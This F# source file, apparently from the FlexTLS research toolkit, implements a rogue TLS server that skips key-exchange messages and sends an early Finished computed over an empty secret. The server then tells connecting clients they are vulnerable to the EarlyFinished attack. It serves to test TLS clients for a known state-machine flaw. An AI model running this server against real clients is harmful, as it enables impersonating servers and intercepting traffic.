(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_SKIP_EarlyFinished

open Bytes
open Error
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexHandshake
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexCertificateRequest
open FlexCertificateVerify
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexServerKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexAppData

type Attack_SKIP_EarlyFinished =
    class

    static member server (listening_address:string, ?port:int) : unit =
        let g1 = new System.Security.Cryptography.X509Certificates.X509Certificate2("g1.cer") in
        let g2 = new System.Security.Cryptography.X509Certificates.X509Certificate2("g2.cer") in
        let g3 = new System.Security.Cryptography.X509Certificates.X509Certificate2("g3.cer") in
        let chain = (List.map (fun c -> Bytes.abytes c) [g1.RawData; g2.RawData; g3.RawData]) in
        let port = defaultArg port FlexConstants.defaultTCPPort in

        while true do
            // Accept TCP connection from the client
            let st,cfg = FlexConnection.serverOpenTcpConnection(listening_address, "", port) in

            // Start typical RSA key exchange
            let st,nsc,fch   = FlexClientHello.receive(st) in

            // Sanity check: our preferred ciphersuite is there
            if not (List.exists (fun cs -> cs = TLS_RSA_WITH_AES_128_CBC_SHA) (FlexClientHello.getCiphersuites fch)) then
                failwith (perror __SOURCE_FILE__ __LINE__ "No suitable ciphersuite given")
            else

            let fsh = { FlexConstants.nullFServerHello with
                ciphersuite = Some(TLSConstants.TLS_DHE_RSA_WITH_AES_128_CBC_SHA)} in
            let st,nsc,fsh   = FlexServerHello.send(st,fch,nsc,fsh) in
            let st, nsc, fc = FlexCertificate.send(st, Server, chain, nsc) in
            let verify_data = FlexSecrets.makeVerifyData nsc.si (abytes [||]) Server st.hs_log in

            let st,fin = FlexFinished.send(st,verify_data=verify_data) in
          //let st, req = FlexAppData.receive(st) in
            let st = FlexAppData.send(st,"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 49\r\n\r\nYou are vulnerable to the EarlyFinished attack!\r\n") in
            Tcp.close st.ns;
            ()
        done

    end
